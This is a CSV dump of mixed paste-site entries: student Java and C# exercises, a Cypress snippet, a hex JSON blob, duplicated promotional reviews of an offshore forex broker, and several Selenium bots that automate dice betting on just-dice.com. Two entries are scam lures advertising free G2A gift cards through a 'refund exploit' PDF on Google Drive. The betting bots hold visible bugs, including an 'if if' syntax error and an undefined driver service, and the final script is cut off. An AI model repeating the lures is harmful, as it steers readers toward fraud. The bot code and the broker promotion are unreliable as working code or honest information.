id,title,username,language,date,content
yFe7Takk,Untitled,niske,Java,Monday 13th of May 2024 06:59:49 AM CDT,"import java.util.ArrayList;
import java.util.LinkedList;


public class DateKlase {
	
	public static void main (String[] args) {
		
		//LinkedList<String> imena = new LinkedList<String>();
		ArrayList<String> imena = new ArrayList<String>();
		
		imena.add(""Bakurski"");
		imena.add(""Niske"");
		imena.add(""Bogi"");
		imena.add(""Pera"");
		imena.add(""Slavica"");
		
		System.out.println(imena);
		System.out.println();
		
		for (String i : imena)
		{
			System.out.println(i);
		}
		
		System.out.println();
		// dodaj na mesto 2
		
		imena.add(1, ""Vlada"");
		
		System.out.println(imena);
		
		// menja ime na poziciji br 4
		
		System.out.println(""Ime pre promene: "" + imena.get(4));
		imena.set(4, ""Luka"");
		
		System.out.println(imena);
		
		System.out.println(""\nELementi na parnjim pozicijama: "");
		
		int brojac = 0;
		for (String i : imena)
		{
			
			if (brojac % 2 == 0)
			{
				System.out.println(i);
			}
			brojac ++;
		}
		
		System.out.println(""\nImena koja pocinju na s: "");
		
		for (String i : imena)
		{
			
			if (i.charAt(0) == 'S')
			{
				System.out.println(i);
			}
			
		}
		
		// izbaciti element sa pozicije 3
		
		imena.remove(3);
		System.out.println(""\n"" + imena);
		
		String uneto = ""Luka"";
		
		imena.remove(uneto);
		
		System.out.println(""\n"" + imena);
		
		// ZADATAK 2
		
		LinkedList<String> imenaIzFajla = ucitaj(""imena.txt"");
		System.out.println(imenaIzFajla);
		imenaIzFajla.addAll(imena);
		upisiUFajl(""novi.txt"", imenaIzFajla);
		
		
	}
	
	static LinkedList<String> ucitaj(String imeFajla) {
		
			LinkedList<String> imena = new LinkedList<String>();
			if (Svetovid.testIn(imeFajla))
			{
				while (Svetovid.in(imeFajla).hasMore())
				{
					String str = Svetovid.in(imeFajla).readLine();
					imena.add(str);
				}
				Svetovid.in(imeFajla).close();
			}
			return imena;
			
		}
		
		static void upisiUFajl(String imeFajla, LinkedList<String> s) {
		
			for (String ime : s)
			{
				Svetovid.out(imeFajla).println(ime);
			}
			Svetovid.out(imeFajla).close();
		}
	
}
		



"
DMuF6gau,Review Otet Markets,fxvnpro,PHP,Monday 13th of May 2024 06:20:31 AM CDT,"https://www.fxvnpro.com/review-otet-markets/
 
Welcome to Otet Markets, your ultimate destination for financial market trading solutions.



Our team consists of experienced professionals who are dedicated to providing our clients with the best possible trading experience. We specialize in Forex, Commodities, and Indices trading, offering a wide range of products and services designed to meet the diverse needs of our clients.



At Otet Markets, we believe that trust is the cornerstone of any successful business relationship. That is&nbsp;why we prioritize transparency and integrity in all our dealings. Our goal is to facilitate financial transactions and foster a profound sense of customer fulfillment. We build long-term relationships with our clients, based on mutual respect, professionalism, and an unwavering commitment to excellence.



We understand that each client is unique, which is why we offer tailored solutions to meet their individual needs. Whether you're a novice trader or an experienced investor, we have the tools and resources to help you achieve your financial goals. Our state-of-the-art trading platform is user-friendly and intuitive, making it easy for you to trade across multiple markets and instruments.



At Otet Markets, we pride ourselves on our customer-centric approach. Our knowledgeable customer support team is available 24/7 to assist you with any questions or concerns you may have. We and value any feedback and are always striving to improve our services to better serve your needs.



Thank you for choosing Otet Markets as your trusted partner in financial market trading.



We look forward to helping you achieve your investment objectives.



Broker Logo &nbsp;



BROKER INFORMATION



Broker TypeECNCompanyOtet Group LTDFoundation2023CountryThe Republic of Marshall IslandsRegulationOtet Group LTD&nbsp;is a financial brokerage company regulated by Comoros Union (MISA), licenseNo. T2023304 registration No. HY00523012 and also registered in the Republic of Marshall Islands,registration number 118922, Otet Markets has an Identification of legal financial activities (LEI)No. 254900HJ0CZRZVRN8C30 from Bloomberg.Minimum Initial Deposit$25Account Base CurrenciesUSDAccount Deposit MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoneyAccount Withdrawal MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoneyLive ChatYesEmail{mail}@otetmerkets.com{support}@otetmarkets.comCall+35725731042TelegramYes



ADVANTAGES



Free Demo AccountYesSpreadsMin/FloatingStop Out Level45% - Islamic Account50% - Classic/ECN/Premium AccountExecution TypeMarket ExecutionIntroducing Brokers ProgramYesSwap FreeYes (Islamic)PromotionsYesCopy TradingYesTrading Platforms&nbsp;Mobile App, MetaTrader 5, cTraderScalpingYesHedgingYesExpert AdvisorsYesProductsForex, Energy, US Stocks, EU Stocks, Metals, Indices, Cryptos



DISADVANTAGES



RestrictionsThis website is not directed at any jurisdiction and is not intended for any use that would be contrary tolocal law or regulation. The service is not available for residents of T√ºrkiye, Canada and the United States.
"
0yhGrpqk,Review Otet Markets,reviewbrokers,PHP,Monday 13th of May 2024 06:20:24 AM CDT,"https://www.reviewbrokers.net/review-otet-markets/
 
Welcome to Otet Markets, your ultimate destination for financial market trading solutions.



Our team consists of experienced professionals who are dedicated to providing our clients with the best possible trading experience. We specialize in Forex, Commodities, and Indices trading, offering a wide range of products and services designed to meet the diverse needs of our clients.



At Otet Markets, we believe that trust is the cornerstone of any successful business relationship. That is&nbsp;why we prioritize transparency and integrity in all our dealings. Our goal is to facilitate financial transactions and foster a profound sense of customer fulfillment. We build long-term relationships with our clients, based on mutual respect, professionalism, and an unwavering commitment to excellence.



We understand that each client is unique, which is why we offer tailored solutions to meet their individual needs. Whether you're a novice trader or an experienced investor, we have the tools and resources to help you achieve your financial goals. Our state-of-the-art trading platform is user-friendly and intuitive, making it easy for you to trade across multiple markets and instruments.



At Otet Markets, we pride ourselves on our customer-centric approach. Our knowledgeable customer support team is available 24/7 to assist you with any questions or concerns you may have. We and value any feedback and are always striving to improve our services to better serve your needs.



Thank you for choosing Otet Markets as your trusted partner in financial market trading.



We look forward to helping you achieve your investment objectives.



Broker Logo &nbsp;







Broker TypeECNCompanyOtet Group LTDFoundation2023CountryThe Republic of Marshall IslandsRegulationOtet Group LTD&nbsp;is a financial brokerage company regulated by Comoros Union (MISA), licenseNo. T2023304 registration No. HY00523012 and also registered in the Republic of Marshall Islands,registration number 118922, Otet Markets has an Identification of legal financial activities (LEI)No. 254900HJ0CZRZVRN8C30 from Bloomberg.&nbsp;The JurisdictionsThis website is not directed at any jurisdiction and is not intended for any use that would be contrary tolocal law or regulation. The service is not available for residents of T√ºrkiye, Canada and the United States.Live ChatYesEmail{mail}@otetmerkets.com{support}@otetmarkets.comCall+35725731042TelegramYes







Free Demo AccountsYesMinimum Initial Deposit$25Multi-Currency AccountUSDSpreadsMin/FloatingStop Out Level45% - Islamic Account50% - Classic/ECN/Premium AccountIntroducing Brokers ProgramYesSwap FreeYes (Islamic)PromotionsYesCopy TradingYesTrading Platforms&nbsp;Mobile App, MetaTrader 5, cTraderScalpingYesHedgingYesExpert AdvisorsYesAccount Funding MethodsPerfect Money, Skrill, Visa, The Kingdom Bank, Master Card, Tether, WebMoney
"
hcNPRWJQ,ü§ë G2A.com Free Gift Card Guide May 2024 FIX ü§ë,jusst2k4,GetText,Monday 13th of May 2024 06:15:12 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_614028.pdf

Working as of:
13 May 2024"
0QwsMpyA,cypress testing deep,deddyprianto,JavaScript,Monday 13th of May 2024 06:08:01 AM CDT,"  cy.get(""div#groupingSearchItem"")
      .first()
      .then(($element) => {
        const objHtml = $element[0];
        const nameGroupItemSearchElement = objHtml.querySelector(
          ""#nameGroupItemSearch"",
        );
        const buttonAdd = objHtml.querySelector(""button.justify-center"");
        cy.get(buttonAdd).should(""be.visible"").click();
        cy.get(nameGroupItemSearchElement).contains(""Western"");
      });"
WSU3QTXz,ü§ë G2A.com Free Gift Card Guide May 2024 FIX üéÅ,ssss50w,GetText,Monday 13th of May 2024 06:05:12 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
13 May 2024"
d9b4v23m,personal accounting,SaNik74,C#,Monday 13th of May 2024 06:03:56 AM CDT,"namespace personal_accounting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string AddNewDossierCommand = ""add dossier"";
            const string OutputDossierCommand = ""output all dossier"";
            const string FindLastNameCommand = ""find"";
            const string DeleteDossierCommand = ""delete"";
            const string ExitCommand = ""exit"";

            bool isWorking = true;
            string[] fullNames = new string[0];
            string[] jobTitles = new string[0];

            while (isWorking)
            {
                Console.WriteLine($""–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö:"" +
            $""\n–î–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—å–µ –≤–≤–µ–¥–∏—Ç–µ - {AddNewDossierCommand}."" +
            $""\n–î–ª—è –≤—ã–≤–æ–¥–∞ –≤—Å–µ–π –±–∞–∑—ã –≤–≤–µ–¥–∏—Ç–µ - {OutputDossierCommand}."" +
            $""\n–î–ª—è —É–¥–∞–ª–µ–Ω–∏—è –¥–æ—Å—å–µ –≤–≤–µ–¥–∏—Ç–µ - {DeleteDossierCommand}."" +
            $""\n–î–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ —Ñ–∞–º–∏–ª–∏–∏ –≤–≤–µ–¥–∏—Ç–µ - {FindLastNameCommand}."" +
            $""\n–î–ª—è –≤—ã—Ö–æ–¥–∞ –≤–≤–µ–¥–∏—Ç–µ - {ExitCommand}."");

                string? userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddNewDossierCommand:
                        AddDossier(ref fullNames, ref jobTitles);
                        break;

                    case OutputDossierCommand:
                        OutputAllDossier(fullNames, jobTitles);
                        break;

                    case DeleteDossierCommand:
                        DeleteDossier(ref fullNames, ref jobTitles);
                        break;

                    case FindLastNameCommand:
                        FindLastName(fullNames, jobTitles);
                        break;

                    case ExitCommand:
                        isWorking = false;
                        break;

                    default:
                        DisplayUncorrectMessage();
                        break;
                }

                Console.Clear();
            }
        }

        static string[] AddData(string[] array, string indexName)
        {
            string[] tempArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                tempArray[i] = array[i];
            }

            Console.Write($""–í–≤–µ–¥–∏—Ç–µ {indexName}: "");
            string? name = Console.ReadLine();
            tempArray[array.Length] = name;
            array = tempArray;
            return array;
        }

        static void AddDossier(ref string[] fullNames, ref string[] jobTitles)
        {
            string fullName = ""–§–ò–û"";
            string jobTitle = ""–¥–æ–ª–∂–Ω–æ—Å—Ç—å"";

            fullNames = AddData(fullNames, fullName);
            jobTitles = AddData(jobTitles, jobTitle);
        }

        static void OutputAllDossier(string[] fullNames, string[] jobTitles)
        {
            if (fullNames.Length == 0)
            {
                Console.WriteLine(""–ú–∞—Å—Å–∏–≤ –ø—É—Å—Ç."");
                Console.ReadKey();
            }
            else
            {
                for (int i = 0; i < fullNames.Length - 1; i++)
                {
                    int serialNumber = i + 1;

                    Console.Write($""{serialNumber} {fullNames[i]} {jobTitles[i]} - "");
                }

                Console.Write($""{fullNames.Length} {fullNames[fullNames.Length - 1]} {jobTitles[jobTitles.Length - 1]}."");

                Console.ReadKey();
            }
        }

        static string[] FillArraytoIndex(string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index; i++)
            {
                tempArray[i] = array[i];
            }

            for (int i = index + 1; i < array.Length; i++)
            {
                tempArray[i - 1] = array[i];
            }

            array = tempArray;
            return array;
        }

        static void DeleteDossier(ref string[] fullNames, ref string[] jobTitles)
        {
            Console.Write(""–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ—Å—å–µ, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å: "");

            bool isNumber = int.TryParse(Console.ReadLine(), out int result);

            if (isNumber == true)
            {
                int number = result - 1;

                if (number >= fullNames.Length || number < 0)
                {
                    Console.WriteLine(""–ß–∏—Å–ª–æ –≤—ã—à–ª–æ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –º–∞—Å—Å–∏–≤–∞."");
                    Console.ReadKey();
                }
                else if (fullNames.Length == 0)
                {
                    Console.WriteLine(""–ú–∞—Å—Å–∏–≤ –ø—É—Å—Ç."");
                    Console.ReadKey();
                }
                else
                {
                    fullNames = FillArraytoIndex(fullNames, number);
                    jobTitles = FillArraytoIndex(jobTitles, number);
                }
            }
            else
            {
                Console.WriteLine(""–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–≤–µ—Å—Ç–∏ —á–∏—Å–ª–æ."");
                Console.ReadKey();
            }
        }

        static void FindLastName(string[] fullNames, string[] jobTitles)
        {
            if (fullNames.Length == 0)
            {
                Console.WriteLine(""–ú–∞—Å—Å–∏–≤ –ø—É—Å—Ç."");
                Console.ReadKey();
            }
            else
            {
                Console.Write(""–í–≤–µ–¥–∏—Ç–µ —Ñ–∞–º–∏–ª–∏—é: "");
                string? lastName = Console.ReadLine();
                bool isFound = false;

                for (int i = 0; i < fullNames.Length; i++)
                {
                    int serialNumber = i + 1;

                    if (fullNames[i].Split()[0] == lastName)
                    {
                        Console.WriteLine($""{serialNumber} {fullNames[i]} {jobTitles[i]}"");
                        isFound = true;
                    }
                }

                if (isFound == false)
                {
                    Console.WriteLine($""–î–æ—Å—å–µ —Å —Ñ–∞–º–∏–ª–∏–µ–π {lastName} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ."");
                }

                Console.ReadKey();
            }
        }

        static void DisplayUncorrectMessage()
        {
            Console.WriteLine(""–í–≤–µ–¥–µ–Ω–∞ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑."");
            Console.ReadKey();
        }
    }
}"
1bFDxFJ3,data925,TestGuy1,JSON,Monday 13th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'fde2915ef4dfe4fdc1a37e18306e7c06385e443dc1330bf99195dd5d64fd1b540effde59ff04c032151fc946d004948d1ffe2dc38ea65c3580dde6c19d3016403e558a68c9584fcd93d4a01de6abd3ee6423e4ebb0398b6eda84127384138f72448fe4cccff0b6b4c887d04cdf56832f07b0ca191697ae9d6b2b4f626571072e',
  otherdata: [
    'e3391a3e7683ccc618beb2bf0096586b',
    '0e574a33fc54f7fd04239b5740ec490e',
    '7d8f514eece872aa9d948f1d903b72ca',
    '2cc6c3c88216b4300456929dceec5faf',
    '0dc6968fcdc372931dd8560f03f7212a',
    'c01fd121e33ac59cc4136fd347df8255',
    '5b3eef5e8bdf04249f0a3c623e8b21d4',
    '9b1c0213c9770066f7d1c42f116eedd1'
  ]
}"
pdZyKvMQ,use in google colab python snowybot,coinwalk,Python,Monday 13th of May 2024 05:58:54 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = ((float(belance))/240)
fart = 1
base = ((float(belance))/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if if ((float(balance))>=((float(belance))*4)):
        exit()
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
w8wMkHZe,snowybot trial python,coinwalk,Python,Monday 13th of May 2024 05:45:34 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/240)
fart = 1
base = (belance/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((float(balance))>=(belance*4)):
        exit()
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
8Q1rjwWy,snowybot python,coinwalk,Python,Monday 13th of May 2024 05:40:25 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
import subprocess
import sys
try:
    import selenium
except ImportError:
    subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", 'selenium'])
finally:
    import selenium
 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
import time, re, math
from decimal import Decimal
from selenium.webdriver.firefox.options import Options
 
 
sys.setrecursionlimit(1000000000)
options = Options()
options.add_argument(""--headless"")
driver = webdriver.Firefox(options=options) 
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/240)
fart = 1
base = (belance/240)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/12)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*24))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
    driver.find_element(By.ID, ""pct_chance"").send_keys(""49.5000"")
    driver.find_element(By.ID, ""pct_bet"").clear()
    driver.find_element(By.ID, ""pct_bet"").send_keys(rounded_number)
    driver.find_element(By.ID, ""a_lo"").click()
    time.sleep(0.8)
    go()
    
if (1==1):
    go()"
E3CSuYrH,trial,coinwalk,JavaScript,Monday 13th of May 2024 05:32:29 AM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import sys
import json
import time, re, math
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.firefox.service import Service
sys.setrecursionlimit(1000000000)
service = Service(executable_path=""/snap/bin/geckodriver"")
options = webdriver.FirefoxOptions()
options.add_argument(""--headless"")
driver = webdriver.Firefox(service=service, options=options)
print(""please wait loading page and login"")
driver.get(""https://just-dice.com"")
time.sleep(20)
driver.find_element(By.CSS_SELECTOR, ""a.fancybox-item.fancybox-close"").click()
time.sleep(5)
driver.find_element(By.LINK_TEXT, ""Account"").click()
time.sleep(2)
driver.find_element(By.ID, ""myuser"").clear()
driver.find_element(By.ID, ""myuser"").send_keys(""USERNAME"")
time.sleep(0.01)
driver.find_element(By.ID, ""mypass"").clear()
driver.find_element(By.ID, ""mypass"").send_keys(""PASSWORD"")
time.sleep(0.01)
driver.find_element(By.ID, ""myok"").click()
time.sleep(20)  
print(""logged in"")
belance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
freather = 0.0  
fumble = (belance/2400)
fart = 1
base = (belance/2400)
tens = (base*10)
sevens = (base*6.9)
eights = (base*7.9)
gold = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
good = ((math.floor(float(gold)/tens))*tens)
print(""should see bets"")
 
def go(): 
    global base
    global tens
    global sevens
    global eights
    balance = driver.find_element(By.ID, ""pct_balance"").get_attribute(""value"")
    global fumble 
    global freather
    global good
    global fart
    global gold
    global belance
    if ((float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights)) and (not (float(balance)==freather))):
        fumble = float(fumble)*2
        freather = float(balance)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(balance)/120)-fumble)<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+sevens))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base
        freather = 0.0
        good = ((math.floor(float(balance)/tens))*tens)
    if ((((float(belance))-(fumble*240))<=0) and (float(balance)>(((math.floor(float(balance)/tens))*tens)+sevens)) and (float(balance)<(((math.floor(float(balance)/tens))*tens)+eights))):
        fumble = base*2
        freather = float(balance)
        good = ((math.floor(float(balance)/tens))*tens)
    time.sleep(0.1)
    number = float(fumble)
    rounded_number = f""{number:.8f}""
    driver.find_element(By.ID, ""pct_chance"").clear()
